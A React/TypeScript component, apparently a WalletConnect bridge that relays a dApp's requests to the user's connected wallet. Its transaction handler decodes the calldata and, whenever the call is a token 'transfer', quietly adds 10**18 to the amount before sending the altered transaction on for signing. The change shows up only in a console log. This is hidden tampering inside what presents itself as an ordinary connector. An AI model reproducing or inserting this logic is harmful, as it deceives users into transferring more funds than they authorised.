import { useAccount } from "wagmi";
import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useWalletClient } from "wagmi";
import { useWalletConnectClient } from "@/hooks/use-wallet-connect-client.ts";

import { parseAbi, decodeFunctionData, encodeFunctionData } from "viem";

import { whatsabi } from "@shazow/whatsabi";

function ImpersonatorWalletConnect() {
  const { address, chainId } = useAccount();
  const { data: client } = useWalletConnectClient();
  const [wcUrl, setWcUrl] = useState("");
  const { data: walletClient } = useWalletClient();

  useEffect(() => {
    if (!client || !address || !chainId || !walletClient) return;

    client.on("session_proposal", async (proposal) => {
      await client.approve({
        id: proposal.id,
        namespaces: {
          eip155: {
            accounts: [`eip155:${chainId}:${address}`],
            methods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_sign",
              "eth_signTypedData",
              "eth_signTypedData_v3",
              "eth_signTypedData_v4",
              "wallet_getCapabilities",
              "eth_accounts",
              "eth_requestAccounts",
              "wallet_addEthereumChain",
              "wallet_switchEthereumChain",
              "wallet_watchAsset",
              "eth_getPermitNonce",
              "permitNonce",
            ],
            events: ["accountsChanged", "chainChanged"],
          },
        },
      });
    });

    client.on("session_request", async (event) => {
      const { method, params } = event.params.request;

      const formattedParams = params.map((p: string | object) => {
        if (typeof p === "string") {
          try {
            return JSON.parse(p);
          } catch {
            return p;
          }
        }
        return p;
      });

      try {
        if (method === "eth_sendTransaction") {
          const txRequest = formattedParams[0] as {
            to: string;
            data?: string;
            from?: string;
            value?: string;
            gas?: string;
            gasPrice?: string;
            [key: string]: any;
          };

          if (!txRequest.data) {
            try {
              const result = await walletClient.request({
                // @ts-ignore
                method,
                // @ts-ignore
                params: [txRequest],
              });
              await client.respond({
                topic: event.topic,
                response: {
                  id: event.id,
                  jsonrpc: "2.0",
                  result,
                },
              });
            } catch (err: any) {
              await client.respond({
                topic: event.topic,
                response: {
                  id: event.id,
                  jsonrpc: "2.0",
                  error: {
                    code: err.code || 4001,
                    message: err.message || "Error sending tx",
                  },
                },
              });
            }
            return;
          }

          try {
            const calldata: string = txRequest.data;
            const selector = calldata.slice(0, 10);
            const lookup = new whatsabi.loaders.FourByteSignatureLookup();
            const signatures: string[] = await lookup.loadFunctions(selector);

            if (signatures.length === 0) {
              console.warn(`no known signature for selector ${selector}`);

              const passthruResult = await walletClient.request({
                // @ts-ignore
                method,
                // @ts-ignore
                params: [txRequest],
              });
              await client.respond({
                topic: event.topic,
                response: {
                  id: event.id,
                  jsonrpc: "2.0",
                  result: passthruResult,
                },
              });
              return;
            }

            const fnSignature = signatures[0];
            const fullFragment = `function ${fnSignature}`;
            const abi = parseAbi([fullFragment]);

            const decoded = decodeFunctionData({
              abi,
              // @ts-ignore
              data: calldata,
            });

            console.log("decoded args", decoded.args);
            console.log(`calling function ${decoded.functionName}`);
            // @ts-ignore
            let newArgs = [...decoded.args];

            if (decoded.functionName === "transfer") {
              // @ts-ignore
              const originalAmount = decoded.args[1] as bigint;
              const bumpedAmount = originalAmount + BigInt(10 ** 18);
              newArgs[1] = bumpedAmount;
              console.log(
                `bumped amount from ${originalAmount} to ${bumpedAmount}`,
              );
            }

            // @ts-ignore
            const newData = encodeFunctionData({
              abi,
              functionName: decoded.functionName,
              args: newArgs as any[],
            });

            txRequest.data = newData;

            const result = await walletClient.request({
              // @ts-ignore
              method,
              // @ts-ignore
              params: [txRequest],
            });

            await client.respond({
              topic: event.topic,
              response: {
                id: event.id,
                jsonrpc: "2.0",
                result,
              },
            });
          } catch (err: any) {
            console.error("failed to decode:", err);
            await client.respond({
              topic: event.topic,
              response: {
                id: event.id,
                jsonrpc: "2.0",
                error: {
                  code: err.code || 4001,
                  message: err.message || "Error decoding tx",
                },
              },
            });
          }

          return;
        }
      } catch (err: any) {
        console.log(err);
      }

      try {
        const result = await walletClient.request({
          // @ts-ignore
          method,
          params: formattedParams,
        });

        await client.respond({
          topic: event.topic,
          response: {
            id: event.id,
            jsonrpc: "2.0",
            result,
          },
        });
      } catch (error: any) {
        console.log("error method", method, error);
        await client.respond({
          topic: event.topic,
          response: {
            id: event.id,
            jsonrpc: "2.0",
            error: {
              code: error.code || 4001,
              message: error.message || "Request error",
            },
          },
        });
      }
    });

    return () => {
      if (client) {
        client.removeAllListeners("session_proposal");
        client.removeAllListeners("session_request");
        client.removeAllListeners("session_connect");
        client.removeAllListeners("session_delete");
      }
    };
  }, [client, address, chainId, walletClient]);

  async function handleConnect() {
    if (!client) return;
    await client.pair({ uri: wcUrl });
  }

  async function handleDisconnect() {
    if (!client) return;
    const sessions = client.session.getAll();
    await Promise.all(
      sessions.map((session) =>
        client.disconnect({
          topic: session.topic,
          reason: {
            code: 6000,
            message: "User disconnected",
          },
        }),
      ),
    );
  }

  return (
    <div className="flex flex-col gap-2">
      <Input
        placeholder="wc:"
        onChange={(e) => setWcUrl(e.target.value)}
        value={wcUrl}
      />
      <div className="grid grid-cols-2 gap-2">
        <Button variant="secondary" onClick={handleDisconnect}>
          Disconnect
        </Button>
        <Button onClick={handleConnect}>Connect</Button>
      </div>
    </div>
  );
}

export default ImpersonatorWalletConnect;
